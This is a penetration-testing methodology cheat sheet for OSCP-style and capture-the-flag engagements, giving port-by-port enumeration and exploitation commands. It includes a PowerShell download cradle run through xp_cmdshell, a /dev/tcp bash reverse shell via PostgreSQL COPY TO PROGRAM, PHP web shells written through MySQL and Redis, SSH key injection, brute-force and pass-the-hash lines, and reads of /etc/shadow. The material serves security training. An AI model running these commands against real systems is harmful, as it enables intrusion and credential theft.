---
id: "01"
title: "Master Methodology"
tags: ["all","methodology"]
---
# 01 — Master Methodology: All Environments

> **Description:** Universal PT methodology — works on any target before you know what you're facing.
> **Best For:** Starting any engagement blind, CTF machines, OSCP exam.
> **Strength:** Phase-gated decision trees with exact commands. Never be unsure what to do next.

---

## Phase 1 — Initial Recon & Scanning

### The Three Scans You Always Run

```bash
# SCAN 1: Quick — common ports, scripts, version detection (run first, fastest results)
nmap -sC -sV -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,512,513,514,587,\
631,873,993,995,1433,1521,2049,3306,3389,5432,5900,5985,5986,6379,8080,8443,8888,\
9090,27017 <TARGET-IP> -oA scans/quick

# SCAN 2: Full TCP — every port (run in background immediately)
nmap -p- --min-rate 5000 -T4 <TARGET-IP> -oA scans/full_tcp

# SCAN 3: UDP — top ports (slow, but critical — SNMP, TFTP, DNS, NFS often here)
nmap -sU --top-ports 200 --min-rate 2000 <TARGET-IP> -oA scans/udp

# After full TCP scan completes — run scripts against ALL open ports found
nmap -sC -sV -p <PORTS-FROM-SCAN2> <TARGET-IP> -oA scans/targeted
```

**Decision tree after scans:**

- Web port open (80/443/8080/8443)? → [Web Application PT Methodology](/technique/web-application-pt/)
- SMB / Kerberos / LDAP open (445/88/389)? → [Active Directory Methodology](/technique/active-directory/)
- Only SSH + 1-2 services? → service enumeration below, then exploit
- Nothing obvious? → run a UDP scan, check for missed ports

---

## Phase 2 — Service Enumeration (Port-by-Port)

### FTP — Port 21

```bash
# Check anonymous access first — this works more often than you'd think
ftp <TARGET-IP>            # login: anonymous / anonymous or anonymous / (blank)
ftp <TARGET-IP>            # try: anonymous / email@email.com

# Nmap FTP scripts
nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p 21 <TARGET-IP>

# Brute force (after you have a username)
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET-IP>

# Recursive download everything from FTP
wget -m --no-passive ftp://anonymous:anonymous@<TARGET-IP>/
```

**What to look for:** Anonymous login, writable directories, interesting files (configs, backups, credentials), software version for CVE lookup.

**Most common exploit path:** Anonymous access with sensitive files → or vsftpd 2.3.4 backdoor (smiley face exploit) → Metasploit `exploit/unix/ftp/vsftpd_234_backdoor`

---

### SSH — Port 22

```bash
# Banner grab — version matters for CVE research
nc -nv <TARGET-IP> 22
ssh -V    # local version check

# Check for weak algorithms (older boxes)
nmap --script ssh2-enum-algos -p 22 <TARGET-IP>

# Username enumeration (OpenSSH < 7.7)
python3 /usr/share/exploitdb/exploits/linux/remote/45939.py <TARGET-IP> <USERNAME>

# Brute force (last resort — noisy)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET-IP>
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET-IP>

# Try found credentials or default creds
ssh <USER>@<TARGET-IP>
ssh -i id_rsa <USER>@<TARGET-IP>     # if you found a private key
```

**Most common exploit path:** Found creds/key from another service → SSH in. Rarely the primary exploit vector unless ancient OpenSSH version.

---

### SMTP — Port 25 / 587

```bash
# Enumerate valid users via VRFY/EXPN
nc -nv <TARGET-IP> 25
VRFY root
VRFY admin
EXPN postmaster

# Automated user enum
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <TARGET-IP>
smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/unix_users.txt -t <TARGET-IP>

# Nmap SMTP scripts
nmap --script smtp-enum-users,smtp-commands,smtp-open-relay -p 25 <TARGET-IP>
```

**Most common exploit path:** Username enumeration → password spray those usernames on other services (SSH, web login, SMB).

---

### DNS — Port 53

```bash
# Zone transfer — gold mine if it works
dig axfr <DOMAIN> @<TARGET-IP>
host -l <DOMAIN> <TARGET-IP>

# Reverse lookup
dig -x <TARGET-IP> @<TARGET-IP>

# Standard queries
dig any <DOMAIN> @<TARGET-IP>
dig ns <DOMAIN> @<TARGET-IP>
dig mx <DOMAIN> @<TARGET-IP>

# Subdomain brute force
gobuster dns -d <DOMAIN> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r <TARGET-IP>
```

**Most common exploit path:** Zone transfer reveals internal hostnames and IPs → more targets to enumerate.

---

### HTTP/HTTPS — Port 80 / 443 / 8080 / 8443

→ **See [Web Application PT Methodology](/technique/web-application-pt/) for the full deep dive.**

```bash
# Quick checks while reading full methodology
whatweb http://<TARGET-IP>
nikto -h http://<TARGET-IP> -o scans/nikto.txt
curl -IL http://<TARGET-IP>

# Directory brute force — start immediately
gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak -o scans/gobuster.txt

# Check robots.txt and sitemap
curl http://<TARGET-IP>/robots.txt
curl http://<TARGET-IP>/sitemap.xml
```

---

### SMB — Port 139 / 445

```bash
# Null session and share enumeration
smbclient -L //<TARGET-IP> -N
smbclient -L //<TARGET-IP> -U ""
enum4linux -a <TARGET-IP> | tee scans/enum4linux.txt
enum4linux-ng -A <TARGET-IP> | tee scans/enum4linux-ng.txt

# CrackMapExec — fast SMB recon
crackmapexec smb <TARGET-IP>
crackmapexec smb <TARGET-IP> -u '' -p '' --shares
crackmapexec smb <TARGET-IP> -u 'guest' -p '' --shares

# Nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode -p 139,445 <TARGET-IP>
nmap --script smb-vuln-ms17-010 -p 445 <TARGET-IP>      # EternalBlue check

# Connect to a share
smbclient //<TARGET-IP>/sharename -N
smbclient //<TARGET-IP>/sharename -U username

# Mount share
mount -t cifs //<TARGET-IP>/sharename /mnt/smb -o user=<USER>,password=<PASS>

# Recursive download
smbclient //<TARGET-IP>/sharename -N -c "recurse; prompt; mget *"
```

**Most common exploit path:** Anonymous/null session → find files with creds → use creds elsewhere. Or: MS17-010 (EternalBlue) → SYSTEM shell via Metasploit or manual.

---

### RPC / MSRPC — Port 135 (rpcbind 111)

```bash
# Windows MSRPC: dump the endpoint mapper
impacket-rpcdump <TARGET-IP>

# Null-session rpcclient: users, groups, and password policy with no creds
rpcclient -U "" -N <TARGET-IP>
# Inside rpcclient: enumdomusers ; queryuser 0x1f4 ; enumdomgroups ; getdompwinfo ; lsaenumsid

# Linux rpcbind (111): list registered RPC services
rpcinfo <TARGET-IP>
```

**Most common exploit path:** Null-session rpcclient dumps the user list and password policy → build a spray list. On Linux, rpcinfo exposes NFS/NIS to pivot.

---

### LDAP — Port 389 / 636

```bash
# Anonymous bind: discover the base DN, then dump the directory tree
ldapsearch -x -H ldap://<TARGET-IP> -s base namingcontexts
ldapsearch -x -H ldap://<TARGET-IP> -b "<BASE-DN>"

# Users and groups (anonymous, or add -D/-w for authenticated)
ldapsearch -x -H ldap://<TARGET-IP> -b "<BASE-DN>" "(objectClass=user)" sAMAccountName
ldapsearch -x -H ldap://<TARGET-IP> -D "<USER>@<DOMAIN>" -w "<PASS>" -b "<BASE-DN>"

# nmap LDAP scripts
nmap -p 389 --script ldap-rootdse,ldap-search <TARGET-IP>

# With creds: dump the whole domain to browsable HTML
ldapdomaindump -u "<DOMAIN>\<USER>" -p "<PASS>" ldap://<TARGET-IP>
```

**Most common exploit path:** Anonymous bind or any domain credential → full user, group, and computer list plus description fields (passwords hide here) → feeds Kerberoasting and BloodHound (see the AD Attack Path).

---

### Kerberos — Port 88

```bash
# Username enumeration via Kerberos pre-auth: no creds, no lockout, very quiet
kerbrute userenum -d <DOMAIN> --dc <DC-IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AS-REP roast users that do not require pre-auth (from a username list)
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC-IP> -usersfile users.txt -no-pass

# Validate a credential and request a TGT (seeds pass-the-ticket)
impacket-getTGT <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>
```

**Most common exploit path:** Kerbrute confirms valid usernames off a wordlist with zero lockout risk → AS-REP roast the ones without pre-auth → crack offline. The classic unauthenticated way into AD (see the AD Attack Path).

---

### SNMP — Port 161 (UDP)

```bash
# Community string brute force
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET-IP>

# Full SNMP walk (once you have community string — default is 'public')
snmpwalk -c public -v1 <TARGET-IP>
snmpwalk -c public -v2c <TARGET-IP>

# Useful OIDs to target specifically
snmpwalk -c public -v1 <TARGET-IP> 1.3.6.1.4.1.77.1.2.25    # Users
snmpwalk -c public -v1 <TARGET-IP> 1.3.6.1.2.1.25.4.2.1.2   # Running processes
snmpwalk -c public -v1 <TARGET-IP> 1.3.6.1.2.1.25.6.3.1.2   # Installed software
snmpwalk -c public -v1 <TARGET-IP> 1.3.6.1.2.1.6.13.1.3     # Open TCP ports

# snmp-check for formatted output
snmp-check <TARGET-IP> -c public
```

**Most common exploit path:** Community string = 'public' → user list → password spray. Or: full MIB walk reveals credentials in process list or config.

---

### NFS — Port 111 / 2049

```bash
# Show available NFS shares
showmount -e <TARGET-IP>
nmap -sV --script=nfs-showmount <TARGET-IP>

# Mount a share
mkdir /mnt/nfs
mount -t nfs <TARGET-IP>:/share /mnt/nfs -nolock
ls -la /mnt/nfs

# Check for no_root_squash (game over: exploit covered in Linux PrivEsc)
cat /etc/exports    # on target if you have shell access
```

**Most common exploit path:** World-readable share with sensitive files → or `no_root_squash` → copy SUID bash → root shell.

---

### MySQL — Port 3306

```bash
# Connect (try root with no password)
mysql -h <TARGET-IP> -u root -p
mysql -h <TARGET-IP> -u root --password=""

# Nmap MySQL scripts
nmap --script mysql-empty-password,mysql-info,mysql-databases -p 3306 <TARGET-IP>

# Once in — key commands
show databases;
use <db>;
show tables;
select * from users;
select user,password from mysql.user;    # Password hashes

# File read/write (if FILE privilege granted)
SELECT LOAD_FILE('/etc/passwd');
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

---

### MSSQL — Port 1433

```bash
# Connect with impacket
impacket-mssqlclient <USER>:<PASS>@<TARGET-IP>
impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET-IP> -windows-auth

# Nmap MSSQL scripts
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-config -p 1433 <TARGET-IP>

# CrackMapExec
crackmapexec mssql <TARGET-IP> -u <USER> -p <PASS>

# Enable xp_cmdshell for RCE (if sa user or sysadmin role)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://<YOUR-IP>/shell.ps1\")"';
```

---

### PostgreSQL — Port 5432

```bash
# Connect: try default postgres:postgres or a blank password
psql -h <TARGET-IP> -U postgres
PGPASSWORD=<PASS> psql -h <TARGET-IP> -U <USER> -l

# nmap PostgreSQL scripts
nmap -p 5432 --script pgsql-brute <TARGET-IP>

# RCE via COPY ... TO PROGRAM (needs superuser, PostgreSQL 9.3+)
# Inside psql: COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<YOUR-IP>/<LPORT> 0>&1"';
```

**Most common exploit path:** Default `postgres:postgres` → if the role is superuser, `COPY ... TO PROGRAM` runs OS commands → reverse shell.

---

### RDP — Port 3389

```bash
# Check if RDP is actually running
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 <TARGET-IP>

# Brute force (use sparingly — account lockout risk)
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<TARGET-IP>
crowbar -b rdp -s <TARGET-IP>/32 -u <USER> -C /usr/share/wordlists/rockyou.txt

# Connect
xfreerdp /u:<USER> /p:<PASS> /v:<TARGET-IP>
xfreerdp /u:<USER> /p:<PASS> /v:<TARGET-IP> /cert:ignore /dynamic-resolution

# Pass-the-Hash via RDP (requires restricted admin mode enabled)
xfreerdp /u:<USER> /pth:<NTLM-HASH> /v:<TARGET-IP>
```

---

### WinRM — Port 5985 / 5986

```bash
# Check if WinRM is open and accessible
crackmapexec winrm <TARGET-IP> -u <USER> -p <PASS>

# Connect with evil-winrm
evil-winrm -i <TARGET-IP> -u <USER> -p <PASS>
evil-winrm -i <TARGET-IP> -u <USER> -H <NTLM-HASH>    # Pass-the-Hash

# Upload/download files within evil-winrm session
upload /path/to/local/file.exe
download C:\path\to\file.txt
```

---

### Redis — Port 6379

```bash
# Connect (often no auth)
redis-cli -h <TARGET-IP>
redis-cli -h <TARGET-IP> -a <PASSWORD>

# Info dump
info
config get *
keys *

# RCE via SSH key injection (if /root/.ssh is writable)
config set dir /root/.ssh
config set dbfilename authorized_keys
set pwned "\n\n\nssh-rsa AAAA...YOUR-PUBLIC-KEY...\n\n\n"
save

# RCE via webshell (if web root is known and writable)
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php system($_GET['cmd']); ?>"
save
```

---

## Phase 3 — Exploitation Decision Tree

```
You have service version + enumeration data →

  → Is there a known CVE?
      YES → searchsploit <service> <version>
              → Match found → Read the exploit. Understand it. Modify IPs. Run it manually.
              → No match → Check exploit-db.com, packetstormsecurity.com, GitHub
      NO  → Check for:
              - Default credentials (try before anything else)
              - Anonymous / guest access
              - Misconfigurations (writable dirs, etc.)

  → Manual exploit available?
      YES → Run it manually. Understand every step.
              → If it fails, check dependencies, target OS, exact version match
      NO  → Try searchsploit for Metasploit module

  → Metasploit module available?
      YES → Use it only if manual fails or time pressure exists (exam context = avoid MSF)
              use <module>
              set RHOSTS <TARGET-IP>
              set LHOST <YOUR-IP>
              check    # verify target is vulnerable before running
              run
      NO  → Try different service / vector. Re-enumerate.
```

---

## Phase 4 — Post-Exploitation Checklist

### Proof Files

```bash
# Linux proof file
cat /root/proof.txt     # OSCP / PG standard location
cat /root/local.txt     # Sometimes used for low-priv proof
hostname && id && cat /root/proof.txt && ip a   # Full proof screenshot

# Windows proof file (SYSTEM level)
type C:\Users\Administrator\Desktop\proof.txt
type C:\Documents and Settings\Administrator\Desktop\proof.txt
whoami && hostname && type C:\Users\Administrator\Desktop\proof.txt && ipconfig

# Screenshot requirement: command showing proof + whoami + hostname
```

### What to Capture Before Moving On

```bash
# Linux
id && whoami
hostname
cat /etc/passwd
cat /etc/shadow 2>/dev/null
ip a
netstat -tlnp
cat /root/proof.txt
find / -name "*.txt" -o -name "*.conf" -o -name "*.bak" 2>/dev/null | grep -v proc

# Windows
whoami /all
hostname
ipconfig /all
netstat -ano
net user
net localgroup administrators
type C:\Users\Administrator\Desktop\proof.txt
```

---

## Phase 5 — The "Stuck" Protocol

> You've been on a machine 30+ minutes. Nothing is working. Do this in order.

```
STEP 1: Re-read ALL scan output. Slowly. Port you ignored?
STEP 2: Re-run gobuster with a DIFFERENT wordlist (big.txt, raft-large-directories.txt)
STEP 3: Check for virtual hosts (vhosts) — add domain to /etc/hosts, try different headers
STEP 4: Run UDP scan if you haven't yet
STEP 5: Read service banners manually: nc -nv <TARGET-IP> <PORT>
STEP 6: Try all found usernames on all found services
STEP 7: Check if web app has a CMS — run wpscan/joomscan
STEP 8: Look for exploits against the OS version, not just the service
STEP 9: Check for backup files: .bak, .old, .swp, ~, .zip, .tar.gz at every web path
STEP 10: Re-read the box description / tags if on HTB/PG — they sometimes hint the vector
STEP 11: Check HackTricks for the specific service / port
STEP 12: Take a 10-minute break. Fresh eyes catch what tired eyes miss.
```
